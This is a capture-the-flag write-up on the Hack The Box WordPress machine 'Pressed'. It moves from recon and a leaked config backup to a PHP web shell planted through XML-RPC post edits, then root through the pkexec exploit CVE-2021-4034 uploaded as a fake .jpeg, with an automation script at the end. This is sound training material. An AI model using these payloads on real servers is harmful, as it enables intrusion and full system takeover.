---
tags:
title: Pressed - Hard (HTB)
permalink: /Pressed-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Recon

```bash
nmap -sCV -p80 10.129.136.28                                                                                                                 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-02 00:02 -0500
Nmap scan report for 10.129.136.28
Host is up (0.35s latency).

PORT   STATE    SERVICE VERSION
80/tcp open     http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: WordPress 5.9
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: UHC Jan Finals &#8211; New Month, New Boxes

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.88 seconds
```

## Website

![[Pasted image 20260102020419.png]]

```bash
wpscan --url http://pressed.htb
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://pressed.htb/ [10.129.136.28]
[+] Started: Fri Jan  2 00:06:46 2026

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://pressed.htb/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://pressed.htb/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://pressed.htb/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://pressed.htb/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.9 identified (Insecure, released on 2022-01-25).
 | Found By: Rss Generator (Passive Detection)
 |  - http://pressed.htb/index.php/feed/, <generator>https://wordpress.org/?v=5.9</generator>
 |  - http://pressed.htb/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.9</generator>

[+] WordPress theme in use: retrogeek
 | Location: http://pressed.htb/wp-content/themes/retrogeek/
 | Last Updated: 2024-04-26T00:00:00.000Z
 | Readme: http://pressed.htb/wp-content/themes/retrogeek/README.txt
 | [!] The version is out of date, the latest version is 0.7
 | Style URL: http://pressed.htb/wp-content/themes/retrogeek/style.css?ver=42
 | Style Name: RetroGeek
 | Style URI: https://tuxlog.de/retrogeek/
 | Description: A lightweight, minimal, fast and geeky retro theme remembering the good old terminal times...
 | Author: tuxlog
 | Author URI: https://tuxlog.de/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 0.5 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://pressed.htb/wp-content/themes/retrogeek/style.css?ver=42, Match: 'Version: 0.5'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:31 <=============================================================================================================> (137 / 137) 100.00% Time: 00:00:31

[i] Config Backup(s) Identified:

[!] http://pressed.htb/wp-config.php.bak
 | Found By: Direct Access (Aggressive Detection)

<SNIP>
```


```php
 
define( 'DB_NAME', 'wordpress' );

/** Database username */
define( 'DB_USER', 'admin' );

/** Database password */
define( 'DB_PASSWORD', 'uhc-jan-finals-2021' );

/** Database hostname */
define( 'DB_HOST', 'localhost' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

```

![[Pasted image 20260102021515.png]]

![[Pasted image 20260102021607.png]]

```bash
 curl --data "<methodCall><methodName>system.listMethods</methodName><params></params></methodCall>" http://pressed.htb/xmlrpc.php
<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
  <params>
    <param>
      <value>
      <array><data>
  <value><string>system.multicall</string></value>
  <value><string>system.listMethods</string></value>
  <value><string>system.getCapabilities</string></value>
  <value><string>htb.get_flag</string></value>
  <value><string>demo.addTwoNumbers</string></value>
  <value><string>demo.sayHello</string></value>
```

```bash
curl --data "<methodCall><methodName>htb.get_flag</methodName><params></params></methodCall>" http://pressed.htb/xmlrpc.php
<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
  <params>
    <param>
      <value>
      <string>00f21009406a51eca1eed72cd1d45372
</string>
      </value>
    </param>
  </params>
</methodResponse>

```

```bash
python2.7                          
Python 2.7.18 (default, Aug  1 2022, 06:23:55) 
[GCC 12.1.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> from wordpress_xmlrpc import Client
>>> from wordpress_xmlrpc.methods import posts
>>> client = Client('http://pressed.htb/xmlrpc.php', 'admin', 'uhc-jan-finals-2022')
>>> plist = client.call(posts.GetPosts())
>>> plist
[<WordPressPost: UHC January Finals Under Way>]
>>> dir(plist)
['__add__', '__class__', '__contains__', '__delattr__', '__delitem__', '__delslice__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getitem__', '__getslice__', '__gt__', '__hash__', '__iadd__', '__imul__', '__init__', '__iter__', '__le__', '__len__', '__lt__', '__mul__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__reversed__', '__rmul__', '__setattr__', '__setitem__', '__setslice__', '__sizeof__', '__str__', '__subclasshook__', 'append', 'count', 'extend', 'index', 'insert', 'pop', 'remove', 'reverse', 'sort']
>>> dir(plist[0])
['__class__', '__delattr__', '__dict__', '__doc__', '__format__', '__getattribute__', '__hash__', '__init__', '__module__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__', '_def', 'comment_status', 'content', 'custom_fields', 'date', 'date_modified', 'definition', 'excerpt', 'guid', 'id', 'link', 'menu_order', 'mime_type', 'parent_id', 'password', 'ping_status', 'post_format', 'post_status', 'post_type', 'slug', 'sticky', 'struct', 'terms', 'thumbnail', 'title', 'user']
>>> plist[0].content
'<!-- wp:paragraph -->\n<p>The UHC January Finals are underway!  After this event, there are only three left until the season one finals in which all the previous winners will compete in the Tournament of Champions. This event a total of eight players qualified, seven of which are from Brazil and there is one lone Canadian.  Metrics for this event can be found below.</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:php-everywhere-block/php {"code":"JTNDJTNGcGhwJTIwJTIwZWNobyhmaWxlX2dldF9jb250ZW50cygnJTJGdmFyJTJGd3d3JTJGaHRtbCUyRm91dHB1dC5sb2cnKSklM0IlMjAlM0YlM0U=","version":"3.0.0"} /-->\n\n<!-- wp:paragraph -->\n<p></p>\n<!-- /wp:paragraph -->\n\n<!-- wp:paragraph -->\n<p></p>\n<!-- /wp:paragraph -->'
```

```bash
>>> post_mod = plist[0]
>>> post_mod.content = '<!-- wp:paragraph -->\n<p>The UHC January Finals are underway!  After this event, there are only three left until the season one finals in which all the previous winners will compete in the Tournament of Champions. This event a total of eight players qualified, seven of which are from Brazil and there is one lone Canadian.  Metrics for this event can be found below.</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:php-everywhere-block/php {"code":"JTNDP3BocCUyMCUyMCUwQSUwOWVjaG8oZmlsZV9nZXRfY29udGVudHMoJy92YXIvd3d3L2h0bWwvb3V0cHV0LmxvZycpKTslMEElMDlzeXN0ZW0oJF9HRVQlNUInY21kJyU1RCk7JTIwJTBBPyUzRQ==","version":"3.0.0"} /-->\n\n<!-- wp:paragraph -->\n<p></p>\n<!-- /wp:paragraph -->\n\n<!-- wp:paragraph -->\n<p></p>\n<!-- /wp:paragraph -->'
>>> client.call(posts.EditPost(post_mod.id, post_mod))
True
```

![[Pasted image 20260102024545.png]]

```bash
┌──(root㉿kali)-[/home/zs1n/Desktop/htb/pressed]
└─# ./webshell.sh 'id'    
uid=33(www-data) gid=33(www-data) groups=33(www-data)
                                                                                                                                                                                            
┌──(root㉿kali)-[/home/zs1n/Desktop/htb/pressed]
└─# cat webshell.sh 
#!/bin/bash
comand=$1
curl -s -X GET "http://10.129.136.28/index.php/2022/01/28/hello-world/?cmd=$comand" | sed -n '/<\/table>/,/<\/p>/p' | sed 's/<[^>]*>//g' | awk 'NF'  
```

```bash
./webshell.sh 'find / -perm -4000 2>/dev/null | grep -v "var"'
/usr/bin/at
/usr/bin/fusermount
/usr/bin/sudo
/usr/bin/su
/usr/bin/mount
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/pkexec
```

https://github.com/kimusan/pkwner/blob/main/pkwner.sh
https://python-wordpress-xmlrpc.readthedocs.io/en/latest/ref/methods.html#module-wordpress_xmlrpc.methods.media

```bash
>>> from wordpress_xmlrpc.methods import media
>>> with open('pkexec.sh', 'r') as f:
	... script = f.read()
>>> data = {'name': 'pkexec.jpeg', 'bits': script, 'type': 'text/plain'}
>>> client.call(media.UploadFile(data))
{'attachment_id': '48', 'description': '', 'parent': 0, 'title': 'pkexec.jpeg', 'url': '/wp-content/uploads/2026/01/pkexec.jpeg', 'date_created_gmt': <DateTime '20260102T10:16:57' at 7fc4040ead70>, 'id': '48', 'caption': '', 'link': '/wp-content/uploads/2026/01/pkexec.jpeg', 'file': 'pkexec.jpeg', 'type': 'text/plain', 'thumbnail': '/wp-content/uploads/2026/01/pkexec.jpeg', 'metadata': False}
```

```bash
./webshell.sh 'bash /var/www/html/wp-content/uploads/2026/01/pkexec.jpeg'
██████╗ ██╗  ██╗██╗    ██╗███╗   ██╗███████╗██████╗ 
██╔══██╗██║ ██╔╝██║    ██║████╗  ██║██╔════╝██╔══██╗
██████╔╝█████╔╝ ██║ █╗ ██║██╔██╗ ██║█████╗  ██████╔╝
██╔═══╝ ██╔═██╗ ██║███╗██║██║╚██╗██║██╔══╝  ██╔══██╗
██║     ██║  ██╗╚███╔███╔╝██║ ╚████║███████╗██║  ██║
╚═╝     ╚═╝  ╚═╝ ╚══╝╚══╝ ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝
CVE-2021-4034 PoC by Kim Schulz
[+] Setting up environment&#8230;
[+] Build offensive gconv shared module&#8230;
[+] Build mini executor&#8230;
hello[+] Nice Job
```

```python
import xmlrpc.client
import requests
import sys
import re
from urllib.parse import quote

URL_XMLRPC = "http://pressed.htb/xmlrpc.php"
URL_EXPLOIT = "http://10.129.136.28/index.php/2022/01/28/hello-world/"
USER = "admin"
PASS = "uhc-jan-finals-2022"

def clean_output(html_text):
    match = re.search(r'</table>(.*?)<p>', html_text, re.DOTALL)
    if match:
        content = match.group(1)
        clean = re.sub(r'<[^>]*>', '', content)
        return clean.strip()
    return "[-] No se pudo filtrar la salida correctamente."

def run_attack(file_path):
    try:
        with open(file_path, 'rb') as f:
            content = f.read()
        
        client = xmlrpc.client.ServerProxy(URL_XMLRPC)
        data = {
            'name': 'pkexec-3.jpeg',
            'bits': xmlrpc.client.Binary(content),
            'type': 'image/jpeg'
        }
        
        print(f"[*] Subiendo {file_path}...")
        response = client.wp.uploadFile(0, USER, PASS, data)
        r2 = response['url']
        
        if 'url' in response:
            target_path = f"/var/www/html{r2}" # Ruta típica
            print(target_path)
            print(f"[+] Archivo subido. Ejecutando exploit en el servidor...")

            cmd = f"bash {target_path}"
            r = requests.get(f"{URL_EXPLOIT}?cmd={quote(cmd)}")
            final_output = clean_output(r.text)
            print("\n--- OUTPUT DEL EXPLOIT ---")
            print(final_output)
            print("--------------------------")
            
        else:
            print("[-] Error al subir el archivo.")

    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Uso: python3 autorooteador.py pkexec.sh")
    else:
        run_attack(sys.argv[1])
```

```bash
python3 pwn.py pkexec.sh
[*] Subiendo pkexec.sh...
/var/www/html/wp-content/uploads/2026/01/pkexec-3-14.jpeg
[+] Archivo subido. Ejecutando exploit en el servidor...

--- OUTPUT DEL EXPLOIT ---
██████╗ ██╗  ██╗██╗    ██╗███╗   ██╗███████╗██████╗ 
██╔══██╗██║ ██╔╝██║    ██║████╗  ██║██╔════╝██╔══██╗
██████╔╝█████╔╝ ██║ █╗ ██║██╔██╗ ██║█████╗  ██████╔╝
██╔═══╝ ██╔═██╗ ██║███╗██║██║╚██╗██║██╔══╝  ██╔══██╗
██║     ██║  ██╗╚███╔███╔╝██║ ╚████║███████╗██║  ██║
╚═╝     ╚═╝  ╚═╝ ╚══╝╚══╝ ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝
CVE-2021-4034 PoC by Kim Schulz
[+] Setting up environment&#8230;
[+] Build offensive gconv shared module&#8230;
[+] Build mini executor&#8230;
uid=0(root) gid=0(root) groups=0(root),33(www-data)
1880214281fb4fcce50779fdee45dab4   <------------ root.txt
[+] Nice Job
--------------------------
```

`~Happy Hacking.`
